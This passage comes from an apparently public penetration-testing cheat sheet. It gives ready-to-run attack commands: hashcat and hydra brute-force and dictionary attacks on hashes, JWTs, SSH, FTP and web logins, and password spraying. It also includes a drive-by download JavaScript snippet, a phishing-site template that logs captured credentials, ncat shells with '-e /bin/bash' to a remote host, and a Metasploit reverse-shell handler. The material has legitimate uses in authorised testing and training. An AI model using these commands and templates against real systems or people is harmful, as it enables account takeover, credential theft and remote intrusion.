* [onlinehashcrack.com](https://www.onlinehashcrack.com)
* [hashkiller.io/listmanager](https://hashkiller.io/listmanager) - has many other tools
* [hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) - has many other tools
* [crackstation.net](https://crackstation.net)
* [weakpass.com/wordlist](https://weakpass.com/wordlist) - lots of password dumps
* [packetstormsecurity.com/Crackers/wordlists](https://packetstormsecurity.com/Crackers/wordlists)

### crunch

Generate a lower-alpha-numeric wordlist:

```fundamental
crunch 4 6 -f /usr/share/crunch/charset.lst lalpha-numeric -o crunch_wordlist.txt
```

See the list of all available charsets or add your own in `charset.lst` located at `/usr/share/crunch/` directory.

Generate all the possible permutations from words:

```fundamental
crunch -o crunch_wordlist.txt -p admin 123 \!\"

crunch -o crunch_wordlist.txt -q words.txt
```

Generate all the possible combinations from a charset:

```fundamental
crunch 4 6 -o crunch_wordlist.txt -p admin123\!\"
```

| Option | Description |
| --- | --- |
| -d | Limits the number of consecutive characters |
| -f | Specifies a character set from a file |
| -i | Inverts the output |
| -l | When you use the -t option this option tells crunch which symbols should be treated as literals |
| -o | Specifies the file to write the output to |
| -p | Tells crunch to generate/permute words that don't have repeating characters |
| -q | Tells crunch to read a file and permute what is read |
| -r | Tells crunch to resume generate words from where it left off, -r only works if you use -o |
| -s | Specifies a starting string |
| -t | Specifies a pattern |

| Placeholder | Description |
| --- | --- |
| \@ | Lower case characters |
| \, | Upper case characters |
| \% | Numbers |
| \^ | Symbols |

**Unfortunately, there is no placeholder ranging from lowercase-alpha to symbols.**

Generate all the possible combinations from a placeholder:

```fundamental
crunch 10 10 -o crunch_wordlist.txt -t admin%%%^^

crunch 10 10 -o crunch_wordlist.txt -t admin%%%^^ -d 2% -d 1^

crunch 10 10 + + 123456 \!\" -o crunch_wordlist.txt -t admin@@%^^

crunch 10 10 -o crunch_wordlist.txt -t @dmin@@%^^ -l @aaaaaaaaa
```

### hash-identifier

To identify a hash type, run the following tool:

```fundamental
hash-identifier
```

### Hashcat

Brute force MD5 hashes:

```fundamental
hashcat -m 0 -a 3 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt
```

Brute force NetNTLMv1 hashes:

```fundamental
hashcat -m 5500 -a 3 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt
```

Use `--session=<session_name>` to save, and continue your cracking progress later using `--restore`.

Continue cracking progress:

```fundamental
hashcat --session=cracking --restore
```

| Option | Description |
| --- | --- |
| -m | Hash-type, see references below |
| -a | Attack-mode, see references below |
| --force | Ignore warnings |
| --runtime | Abort session after X seconds of runtime |
| --status | Enable automatic update of the status screen |
| -o | Define outfile for recovered hash |
| --show | Show cracked passwords found in potfile |
| --session | Define specific session name |
| --restore | Restore session from --session |
| --restore-file-path | Specific path to restore file |
| -O | Enable optimized kernels (limits password length) |
| -1 | User-defined charset ?1 |
| -2 | User-defined charset ?2 |
| -3 | User-defined charset ?3 |
| -4 | User-defined charset ?4 |

**When specifying a user-defined charset, escape `?` with another `?` (i.e., use `??` instead of `\?`).**

| Hash Type | Description |
| --- | --- |
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 200  | MySQL323 |
| 300  | MySQL4.1/MySQL5 |
| 1000 | NTLM |
| 5500 | NetNTLMv1-VANILLA / NetNTLMv1-ESS |
| 5600 | NetNTLMv2 |
| 2500 | WPA/WPA2 |
| 16800 | WPA-PMKID-PBKDF2 |
| 16500 | JWT (JSON Web Token) |

For more hash types read the manual.

| Attack Mode | Name |
| --- | --- |
| 0 | Straight |
| 1 | Combination |
| 3 | Brute Force |
| 6 | Hybrid Wordlist + Mask |
| 7 | Hybrid Mask + Wordlist |
| 9 | Association |

| Charset | Description |
| --- | --- |
| \?l | abcdefghijklmnopqrstuvwxyz |
| \?u | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| \?d | 0123456789 |
| \?s | \!\"\#\$\%\&\'\(\)\*\+\,\-\.\/\:\;\<\=\>\?\@\[\]\^\_\`\{\|\}\~ |
| \?a | \?l\?u\?d\?s |
| \?b | 0x00 - 0xff |

Dictionary attack:

```fundamental
hashcat -m 100 -a 0 --session=cracking --force --status -O B1B3773A05C0ED0176787A4F1574FF0075F7521E rockyou.txt

hashcat -m 5600 -a 0 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt rockyou.txt
```

You can find `rockyou.txt` wordlist in [SecLists](#wordlists).

Brute force a hash using a placeholder:

```fundamental
hashcat -m 0 -a 3 --session=cracking --force --status -O cc158fa2f16206c8bd2c750002536211 -1 ?l?u -2 ?d?s ?1?l?l?l?l?l?2?2

hashcat -m 0 -a 3 --session=cracking --force --status -O 85fb9a30572c42b19f36d215722e1780 -1 \!\"\#\$\%\&\/\(\)\=??\* -2 ?d?1 ?u?l?l?l?l?2?2?2
```

### Cracking the JWT

Dictionary attack:

```fundamental
hashcat -m 16500 -a 3 --session=cracking --force --status -O eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
```

You can also check my JWT cracking tool in my project at [ivan-sincek/jwt-bf](https://github.com/ivan-sincek/jwt-bf).

### Hydra

I prefer to use Burp Suite to brute force web forms, and Hydra for other services.

Dictionary attack on an HTTP POST login web form:

```fundamental
hydra -o hydra_results.txt -l admin -P rockyou.txt somesite.com http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed!'
```

When brute forcing a login web form, you must specify `Login=Login:<expected_message>` to distinguish between the successful and failed login attempts. Change the `username` and `password` request parameter names as necessary.

Dictionary attack on a Secure Shell (SSH) login:

```fundamental
hydra -o hydra_results.txt -L users.txt -P rockyou.txt 192.168.8.5 ssh
```

You can find a bunch of useful wordlists in [SecLists](#wordlists).

| Option | Description |
| --- | --- |
| -R | Restore a previous aborted/crashed session |
| -S | Perform an SSL connect |
| -O | Use old SSL v2 and v3 |
| -s | If the service is on a different default port, define it here |
| -l | Login with a login name |
| -L | Load several logins from a file |
| -p | Login with a password |
| -P | Load several passwords from a file |
| -x | Password brute force generation (MIN:MAX:CHARSET), type "-x -h" to get help |
| -y | Disable use of symbols in bruteforce |
| -e | Try "n" null password, "s" login as pass and/or "r" reversed login |
| -o | Write found login/password pairs to a file instead of stdout |
| -f/-F | Exit when a login/pass pair is found (-f per host, -F global) |
| -M | List of servers to attack, one entry per line, ':' to specify port |

| Supported Services |
| --- |
| ftp\[s\] |
| http\[s\]\-\{get\|post\}\-form |
| mysql |
| smb |
| smtp\[s\] |
| snmp |
| ssh |
| telnet\[s\] |
| vnc |

For more supported services read the manual.

| Brute Force Syntax | Description |
| --- | --- |
| MIN | Minimum number of characters in the password |
| MAX | Maximum number of characters in the password |
| CHARSET | Charset values are: "a" for lowercase letters, "A" for uppercase letters, "1" for numbers, and for all others, just add their real representation |

Brute force attack on FTP:

```fundamental
hydra -o hydra_results.txt -l admin -x 4:4:aA1\!\"\#\$\% 192.168.8.5 ftp
```

### Password Spraying

After you have collected enough usernames from the [reconnaissance phase](#1-reconnaissance), it is time to try and brute force some of them.

Find out how to generate a good password spraying wordlist in my project at [ivan-sincek/wordlist-extender](https://github.com/ivan-sincek/wordlist-extender), but first you will need a few good keywords that describe your target.

Such keywords can include a company name, abbreviations, or words that describe the company's services, products, etc.

After you generated the wordlist, use it with tools such as [Hydra](#hydra), [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder), etc., to brute force login web forms. Hydra can attack authentication mechanisms for all kinds of services and ports.

If strong password policy is enforced, lazy passwords usually start with one capitalized word followed by a few digits and one special character at the end (e.g., Password123!).

You can also use the generated wordlist with [hashcat](#hashcat), e.g., to crack NTLMv2 hashes that you have collected using LLMNR responder during a network penetration testing, etc.

## 6. Social Engineering

Find out how to embed a PowerShell script into an MS Word document in my project at [ivan-sincek/powershell-reverse-tcp](https://github.com/ivan-sincek/powershell-reverse-tcp#ms-word).

### Drive-by Download

To force users to download a malicious file, copy and paste this JavaScript code block on any cloned web page:

```javascript
function download(url, type, name, method) {
	var req = new XMLHttpRequest();
	req.open(method, url, true);
	req.responseType = 'blob';
	req.onload = function() {
		var blob = new Blob([req.response], { type: type })
		var isIE = false || !!document.documentMode;
		if (isIE) {
			// IE doesn't allow using a blob object directly as link
			// instead it is necessary to use msSaveOrOpenBlob()
			if (window.navigator && window.navigator.msSaveOrOpenBlob) {
				window.navigator.msSaveOrOpenBlob(blob, name);
			}
		} else {
			var anchor = document.createElement('a');
			anchor.href = window.URL.createObjectURL(blob);
			anchor.download = name;
			anchor.click();
			// in Firefox it is necessary to delay revoking the ObjectURL
			setTimeout(function() {
				window.URL.revokeObjectURL(anchor);
				anchor.remove();
			}, 250);
		}
	};
	req.send();
}
// specify your file here, use only an absolute URL
download('http://localhost/files/pentest.pdf', 'application/pdf', 'pentest.pdf', 'GET');
// download('http://localhost/files/pentest.docx', 'plain/txt', 'pentest.docx', 'GET');
```

To try it out, copy all the content from [\\social_engineering\\driveby_download\\](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/tree/master/social_engineering/driveby_download) to your server's web root directory (e.g., to \\xampp\\htdocs\\ on XAMPP), and navigate to the web page with your preferred web browser.

### Phishing Website

To try it out, copy all the content from [\\social_engineering\\phishing_website\\](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/tree/master/social_engineering/phishing_website) to your server's web root directory (e.g., to \xampp\htdocs\ on XAMPP), and navigate to the web page with your preferred web browser.

Captured credentials will be stored in [\\social_engineering\\phishing_website\\logs\\credentials.log](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/tree/master/social_engineering/phishing_website/logs).

<p align="center"><img src="https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/img/phishing_website.jpg" alt="Phishing Website"></p>

<p align="center">Figure 2 - Phishing Website</p>

Read the comments in [\\social_engineering\\phishing_website\\index.php](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/social_engineering/phishing_website/index.php) to get a better understanding on how all of it works.

You can modify and expand this template to your liking. You have everything that needs to get you started.

You can easily customize [CSS](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/social_engineering/phishing_website/css/main.css) to make it look more like the company you are testing, e.g., change colors, logo, etc.

Check the standalone redirect templates in [\\social_engineering\\phishing_website\\redirects\\](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/social_engineering/phishing_website/redirects) directory.

Use SingleFile ([Chrome](https://chrome.google.com/webstore/detail/singlefile/mpiodijhokgodhhofbcjdecpffjipkle))([FireFox](https://addons.mozilla.org/hr/firefox/addon/single-file)) browser extension to download a web page as a single HTML file, then, rename the file to `index.php`.

## 7. Miscellaneous

Here you can find a bunch of random stuff.

### 7.1 Useful Websites

* [jsonlint.com](https://jsonlint.com)
* [base64decode.org](https://www.base64decode.org)
* [urldecoder.org](https://www.urldecoder.org)
* [bitly.com](https://bitly.com) - URL shortener
* [getcreditcardnumbers.com](https://www.getcreditcardnumbers.com) - dummy credit card info

### cURL

Download a file:

```fundamental
curl somesite.com/somefile.txt -o somefile.txt
```

Upload a file:

```fundamental
curl somesite.com/uploads/ -T somefile.txt
```

| Option | Description |
| --- | --- |
| -d | Sends the specified data in a POST request to the HTTP server |
| -H | Extra header to include in the request when sending HTTP to a server |
| -i | Include the HTTP response headers in the output |
| -k | Proceed and operate server connections otherwise considered insecure |
| -o | Write to file instead of stdout |
| -T | Transfers the specified local file to the remote URL, same as PUT method |
| -v | Make the operation more talkative |
| -x | Use the specified proxy (\[protocol://\]host\[:port\]) |
| -X | Specifies a custom request method to use when communicating with the HTTP server |

Find out how to test a web server for various HTTP methods and method overrides in my project at [ivan-sincek/forbidden](https://github.com/ivan-sincek/forbidden).

### Ncat

\[Server\] Set up a listener:

```fundamental
ncat -nvlp 9000

ncat -nvlp 9000 > received_data.txt

ncat -nvlp 9000 -e /bin/bash

ncat -nvlp 9000 -e /bin/bash --ssl

ncat -nvlp 9000 --ssl-cert crt.pem --ssl-key key.pem

ncat -nvlp 9000 --keep-open <<< "HTTP/1.1 200 OK\r\n\r\n"
```

\[Client\] Connect to a remote host:

```fundamental
ncat -nv 192.168.8.5 9000

ncat -nv 192.168.8.5 9000 < sent_data.txt

ncat -nv 192.168.8.5 9000 -e /bin/bash

ncat -nv 192.168.8.5 9000 -e /bin/bash --ssl

ncat -nv 192.168.8.5 9000 --ssl-cert crt.pem --ssl-key key.pem
```

Find out how to create an SSL/TLS certificate in my project at [ivan-sincek/secure-website](https://github.com/ivan-sincek/secure-website/tree/master/crt).

Check if connection to a specified TCP port (e.g., port 22 or 23) is possible:

```bash
for i in {0..255}; do ncat -nv "192.168.8.${i}" 9000 -w 2 -z 2>&1 | grep -Po '(?<=Connected\ to\ )[^\s]+(?=\.)'; done

for ip in $(cat ips.txt); do ncat -nv "${ip}" 9000 -w 2 -z 2>&1 | grep -Po '(?<=Connected\ to\ )[^\s]+(?=\.)'; done
```

### multi/handler

Set up a listener (change the PAYLOAD, LHOST, and LPORT as necessary):

```fundamental
msfconsole -q

use exploit/multi/handler

set PAYLOAD windows/shell_reverse_tcp

set LHOST 192.168.8.185

set LPORT 9000

exploit
```

### ngrok

Use [ngrok](https://ngrok.com/download) to give your local web server a public address, but do not expose the web server for too long if it is not properly hardened due to security concerns.

I advise you not to transfer any sensitive data over it if you do not trust it.

### Additional References

Credits to the authors!

* [book.hacktricks.xyz](https://book.hacktricks.xyz/welcome/readme)
* [infosecmatter.com/bug-bounty-tips](https://www.infosecmatter.com/bug-bounty-tips)
* [pentestbook.six2dez.com](https://pentestbook.six2dez.com)
